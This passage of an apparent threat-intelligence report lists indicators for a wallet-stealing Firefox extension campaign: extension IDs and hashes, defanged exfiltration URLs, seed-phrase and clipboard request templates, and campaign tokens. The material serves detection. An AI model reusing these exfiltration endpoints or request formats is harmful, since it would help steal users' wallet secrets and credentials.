2. `dash-clip-clear@extlab.org` — Firefox ID `Smart Pass` — observed display name (Version: `4.11.4`) SHA-256: `0e163cde2337fbc11232b548e301dea746b764b898e0decbfcc7940248d4f092`
3. `dash-data-core@browsify.example` — Firefox ID `Clean Swift` — observed display name (Version: `8.16.0`) SHA-256: `56a6dbde57aab6ab2f4f1d5af1d6fbc3e775a600026382e56df7ef5363c50d4d`
4. `dash-tip-grab@linktools.co` — Firefox ID `Shade Deep Pro` — observed display name (Version: `5.0.15`) SHA-256: `e4f351a6d6a8249691eec07223c74ca9c8708522919e1626baef705acb1ad87d`
5. `deep-file-scan@fasttools.example` — Firefox ID `Quick Verify` — observed display name (Version: `7.21.15`) SHA-256: `1b3634aec03d85d9e7463e363b6664e9105f17badfa5f1cf737b1623267ae631`
6. `easy-block-bar@proaddons.example` — Firefox ID `Smart Focus` — observed display name (Version: `4.3.10`) SHA-256: `d671be66381149dc7efb9c77f081fc1e3410cbf2447fe7652b77b08f895503d8`
7. `easy-news-bar@webtools.org` — Firefox ID `Smart Speed` — observed display name (Version: `6.4.5`) SHA-256: `1857acb44d3e577645f7ca64e76a14609d960c6a6efa56ea00c28ac43df4463f`
8. `echo-dock-zen@addonslab.net` — Firefox ID `Net Jot` — observed display name (Version: `9.16.20`) SHA-256: `b44c7cd048bbe7f165fd28a755765c978373ee6761b6ae306ba57e9e1895536b`
9. `echo-focus-pad@addonslab.org` — Firefox ID `Screen Plus` — observed display name (Version: `5.24.9`) SHA-256: `36b8cbed79b91b92e84eb01d61c57c8972cacc68a3d6a3629e2a2b25a59ee11d`
10. `echo-tab-track@devplugs.com` — Firefox ID `Dark Easy` — observed display name (Version: `6.17.9`) SHA-256: `716cc37e2019a92ab1970d74e3ee962cafb4eef97fbd55353f15a34c8e0c2a30`
11. `edge-pad-clear@proaddons.net` — Firefox ID `Smart Proxy` — observed display name (Version: `9.9.23`) SHA-256: `a3d9369e666aeb7230956bd6dd97b7337b829c5ae5139171e90593de17dc9b08`
12. `fast-web-dock@webtools.com` — Firefox ID `Smart Temp` — observed display name (Version: `8.21.25`) SHA-256: `790c869021cf7584271c73cb4eac8a094595e7225f69acc1a4b145903b2bc1c2`
13. `flex-kit-swift@plugify.co` — Firefox ID `Quick Clean` — observed display name (Version: `5.9.22`) SHA-256: `894109c97ccb215f523e41bc968ffa7716959c62c7c3f625cf4c03d50e899072`
14. `link-web-link@addonslab.org` — Firefox ID `Smart Picker` — observed display name (Version: `7.4.25`) SHA-256: `a2eba930f94306f2f4f27b74351c1ce0a75210bac51d9efa09c71d69d3cb9990`
15. `lite-map-box@browsify.net` — Firefox ID `Proxy Box Pro` — observed display name (Version: `7.5.16`) SHA-256: `a3a31d7338b047de63b5c92a8d697292a26b0fccb4797918462139b8767d97f8`
16. `open-file-data@foxplugin.co` — Firefox ID `Bright Focus` — observed display name (Version: `5.13.10`) SHA-256: `f70febe6549d1439cf1f140cae18f13e7150ffe4ca31e3e00656b878a0153366`
17. `open-grab-tip@smartext.net` — Firefox ID `Picker Plus` — observed display name (Version: `7.9.1`) SHA-256: `96d03bb2b8a59db38200278dc17fbafc14c55795a126068f3e7a3fc7a749730f`
18. `open-note-core@plugify.example` — Firefox ID `Flow Organizer` — observed display name (Version: `7.0.0`) SHA-256: `1429f5134b5acf5077a18cf805bc905393524debad75f70a942ec30608f49088`
19. `open-note-kit@extrakits.co` — Firefox ID `Money Zip Pro` — observed display name (Version: `5.12.1`) SHA-256: `708291399f6d98529e02a1d0100084abfe1e09d3fb7d8fefad744f1e7f439420`
20. `open-stat-block@tabtools.com` — Firefox ID `Check Flex Pro` — observed display name (Version: `4.23.20`) SHA-256: `2fb5b89c0889a8bde90845de2db13161f6d8845fa5dbc56bfa474f800c664d9e`
21. `pro-box-scan@cleankits.co` — Firefox ID `Probe Plus` — observed display name (Version: `6.17.9`) SHA-256: `ed63c3a14b51915863bbc443f169dccb73baebdc4e553cdfe18ef1a68b72ffb2`
22. `pro-focus-link@quickext.co` — Firefox ID `Quick Hue` — observed display name (Version: `6.5.10`) SHA-256: `fc74265e10942ee96726c7cce9b642cc7492835cb4eb43d4451bd2aab13e1ec8`
23. `pro-link-box@neattools.org` — Firefox ID `Vpn Dash` — observed display name (Version: `8.4.9`) SHA-256: `57d78328f2cd02e91e511fbee80fc2dc43368adf0c84fac4cc0bbbce3fad5d8a`
24. `pure-grab-nova@browsify.example` — Firefox ID `Convert Map Pro` — observed display name (Version: `5.6.16`) SHA-256: `3f52fcb79e2b8e255030b1270f22618417e622e65406cf6e3e715e2f0a80b9e3`
25. `sharp-file-clean@tabtools.com` — Firefox ID `Pixel Distract` — observed display name (Version: `9.1.21`) SHA-256: `e7ef1558ecba876e2786e5f281d5551e2ab161c52f3443e5c81f4ffd0ba17d5b`
26. `slim-pad-free@tabtools.net` — Firefox ID `Hue Plus` — observed display name (Version: `8.20.17`) SHA-256: `793a2d26dc9781bbf3e61db85009626f7de9edc19bddc349f29b4cf74d1b184e`
27. `smart-note-track@linktools.org` — Firefox ID `Quick Clean` — observed display name (Version: `4.10.5`) SHA-256: `bdcb3789c063a06369ff73906d7776846a163d6c60ff8dbcc549bc2dfe5ea382`
28. `snap-news-dock@foxplugin.net` — Firefox ID `Quick Secure` — observed display name (Version: `5.23.16`) SHA-256: `96be1669cbc95c35a5448311fb808cf915ea89cdee983ae905f903f9fcb5bb6d`
29. `swift-scan-fast@neattools.co` — Firefox ID `Smart Anon` — observed display name (Version: `6.12.9`) SHA-256: `7d950ad43d7e83f8f84a2033f88349d384972a9b69cde3cc2ca1ee28e1be94ed`
30. `sync-zip-kit@netplugs.example` — Firefox ID `Smart Scan` — observed display name (Version: `9.20.18`) SHA-256: `af69e15e02d4c2850a6ed26e9d7d1152e16e2d7d01695bbf3b3840adf0b6bee5`
31. `view-proxy-score@quickext.org` — Firefox ID `Snap Snap Pro` — observed display name (Version: `8.12.3`) SHA-256: `5bebc15d404c4f7314f4e4cd7e24aff1178de124374128bc845a034e3f6c9853`
32. `zen-box-clip@protools.com` — Firefox ID `Smart Night` — observed display name (Version: `4.0.20`) SHA-256: `14a2da218e41d3854e731d02f8a444a1b9712ba2788d57b5a76c18737bd559ae`
33. `dash-map-fast@addonslab.com` — Firefox ID `Dash Money` — observed display name (Version: `6.10.7`) SHA-256: `1753fa38657c6c0d23ff7ca12a768a1b23ac3d8f3896c746ae2bdc7538c03009`
34. `easy-map-pixel@extlab.co` — Firefox ID `Smart Write` — observed display name (Version: `4.13.15`) SHA-256: `eec0638729b096e0d0f93173be9b105b15371b76c167dfa89e5a882ee290d9cb`
35. `quick-dash-pixel@extlab.example` — Firefox ID `Forecast Tip` — observed display name (Version: `7.3.23`) SHA-256: `b8b5ad5c18626e11bf4960a8245539334367be6655bd4c21140bb27c82efb679`
36. `safe-scan-zip@fasttools.co` — Firefox ID `Proxy Scan` — observed display name (Version: `6.21.23`) SHA-256: `3f73e8af9eb2d664be44e07955253a59c5dab684c645ab648f36c2cbccddcdb3`
37. `view-tool-box@protools.net` — Firefox ID `Currency Hub` — observed display name (Version: `5.7.2`) SHA-256: `eb4718f52161d2262e9aa83b4b561fa475486f5183600376d002be3333823787`

### Historical Sports-Shell Versions Under Confirmed Malicious Firefox IDs

These packages do not add to the 77-extension identity count. They are earlier versions of Firefox IDs classified above as confirmed malicious and provide direct evidence of repurposing from sports-score shells into wallet-stealing extensions.

1. `bright-save-feed@tabtools.org` `Quick Quick` — observed display name (Version: `7.4.0`, football) SHA-256: `1381fc82afd785cb0dfc2cf511ed49d4487cb9cd4edee9f741b38710624a1bd0`
2. `swift-clip-link@fasttools.co` `Dial Open Pro` — observed display name (Version: `7.23.25`, football) SHA-256: `2a0856637d0e3850b153713ef34d1963b6d6b06acaa1e4fbdc6fa305483987ca`
3. `deep-tip-sharp@browsify.co` `Quick Shield` — observed display name (Version: `5.7.1`, basketball) SHA-256: `d5c5331b82771fe91213c246d076ad6d08157b5390fabb4a1d7209b1a5db15dd`
4. `bolt-save-vault@devplugs.co` `Lite Swatch` — observed display name (Version: `6.5.21`, NBA) SHA-256: `68b25a9761e04f3c68af6d94e2ad3ca259ebbaf06e90798d6c2613ddc3e434c4`
5. `core-note-nova@webtools.net` `Key Pulse` — observed display name (Version: `8.1.21`, American football) SHA-256: `5dcbce26e54dd44d0b932e23f1a741298d4e35487d1868b469518f903e577a7a`
6. `gear-save-tip@extrakits.example` `Timer Pulse` — observed display name (Version: `5.5.5`, American football) SHA-256: `e0373ebe9eec5ec6734bbbd012fc9874c78b35f7cd444e9df1461f8d03d3b0d0`
7. `flex-lab-save@foxplugin.co` `Track Quick` — observed display name (Version: `6.10.24`, basketball) SHA-256: `5328d5e600d1de7e4ffe8bd38dd1fdf22f1226b21c4d77db10aca7c9ce31c2a8`
8. `pure-net-snap@fasttools.co` `Store Plus` — observed display name (Version: `8.3.18`, American football) SHA-256: `1cbe34e76e4ebb1e8b185f67e8f5bc507427af7692512b9e6a93ec6051685d95`
9. `fast-zip-true@smartext.co` `Pomodoro Plus` — observed display name (Version: `9.13.24`, NBA) SHA-256: `b65143df86edd60625fcbc0fcb396ef02baae6e731c1993e70873563e5a1524c`

### Supabase Remote-Control Infrastructure

The parent `supabase.co` domain belongs to a legitimate service. The following specific project URLs are embedded in campaign packages and used as remote-control artifacts.

1. `hxxps://kyfyvuwifdukctqyggto[.]supabase[.]co`
2. `hxxps://acrfruxtmulgvyvtbwgq[.]supabase[.]co`
3. `hxxps://efiukydskwkeatexavdp[.]supabase[.]co`
4. `hxxps://mzghdnikguesdamuxjbm[.]supabase[.]co`
5. `hxxps://nxsixihozitybwrbahiu[.]supabase[.]co`
6. `hxxps://yvqmtnmeivrcyomyeouz[.]supabase[.]co`
7. `hxxps://vgksucdjccsojzuhckzk[.]supabase[.]co`

### Residual Supabase Configuration Embedded in the Fake OKX Extension

- `hxxps://vnigkfdwwyphfafficet[.]supabase[.]co`

### Observed REST Query Pattern

- `/rest/v1/public_notes?select=content&order=created_at.desc&limit=1`

### Phishing Infrastructure

The parent `pages.dev` domain belongs to a legitimate hosting service. The following specific threat actor-controlled site is associated with the campaign:

- `hxxps://portal-web3-extension-welcome[.]pages[.]dev/home`

### Cloudflare Worker Exfiltration Infrastructure

The parent `workers.dev` domain belongs to a legitimate Cloudflare service. Use the exact worker subdomains rather than blocking or detecting on the parent domain.

1. `hxxps://dry-bush-5408[.]animalrescueeducationcenter-org[.]workers[.]dev/`
2. `hxxps://winter-smoke-a612[.]icy-star-f45c[.]workers[.]dev/`
3. `hxxps://quiet-thunder-ade3[.]bankoganger[.]workers[.]dev/`
4. `hxxps://winter-waterfall-0606[.]rihaniomar21[.]workers[.]dev/`

### Observed GET Exfiltration Patterns

1. `hxxps://dry-bush-5408[.]animalrescueeducationcenter-org[.]workers[.]dev/?a=login&s=EQOx7EIPZSNi&k=login&w=<mnemonic>`
2. `hxxps://winter-smoke-a612[.]icy-star-f45c[.]workers[.]dev/?a=login&s=EQOx7EIPZSNi&k=login&w=<mnemonic>`
3. `hxxps://winter-waterfall-0606[.]rihaniomar21[.]workers[.]dev/?w1=<mnemonic>`

### Observed POST Body Pattern

- `action=login&ss=EQOx7EIPZSNi&key=login&w1=<mnemonic>`

### Serialized-Keyring Exfiltration Infrastructure

1. `hxxp://id[.]gemachriverdale[.]org:9000/hook/ptvve`
2. `hxxp://id[.]gemachriverdale[.]org:9000/hook/rra`
3. `hxxp://id[.]gemachriverdale[.]org:9000/hook/pastre`
4. `hxxp://alt[.]e-wl[.]com:9000/hook/alt`
5. `hxxp://consol[.]e-wl[.]com:9000/hook/cosomid`
6. `hxxp://firebase[.]e-wl[.]com:9000/hook/see`
7. `hxxp://mapid[.]e-wl[.]com:9000/hook/mapid`
8. `hxxp://ommid[.]e-wl[.]com:9000/hook/ommid`
9. `hxxp://pch[.]e-wl[.]com:9000/hook/pch`
10. `hxxp://rest[.]e-wl[.]com:9000/hook/rest`
11. `hxxp://temple[.]e-wl[.]com:9000/hook/temple`
12. `hxxp://typec[.]e-wl[.]com:9000/hook/typo`
13. `hxxp://vala[.]e-wl[.]com:9000/hook/value`

### Observed JSON Body Structure

- `{"ping":<serialized_keyring_array>}`

### Credential and Clipboard Exfiltration Infrastructure

#### C2 Address

- `77[.]91[.]100[.]175`

#### Credential Collection URL

- `hxxp://77[.]91[.]100[.]175/html/app[.]php`

#### Clipboard Collection URL

- `hxxp://77[.]91[.]100[.]175/html/continue[.]php`

#### Observed Clipboard Query Parameters

- `uid=<identifier>&part=<chunk_number>&total=<chunk_count>&data=<encoded_clipboard_data>`

### Campaign Tokens and Request Markers

- `EQOx7EIPZSNi`
- `a=login&s=EQOx7EIPZSNi&k=login&w=`
- `action=login&ss=EQOx7EIPZSNi&key=login&w1=`
- `SEED_PHRASE_IMPORT`
- `quickVaultNote`
- `public_notes`
- `collectMetrics`
- `apropriate`

The final two values are implementation markers shared by the direct credential and clipboard-stealing variants. They should be combined with package, network, or surrounding code indicators rather than used alone.

## MITRE ATT&CK

- T1176.001 — Software Extensions: Browser Extensions
- T1204 — User Execution
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1056.002 — Input Capture: GUI Input Capture
- T1005 — Data from Local System
- T1115 — Clipboard Data
- T1102.001 — Web Service: Dead Drop Resolver
- T1071.001 — Application Layer Protocol: Web Protocols
- T1020 — Automated Exfiltration
- T1030 — Data Transfer Size Limits
- T1041 — Exfiltration Over C2 Channel
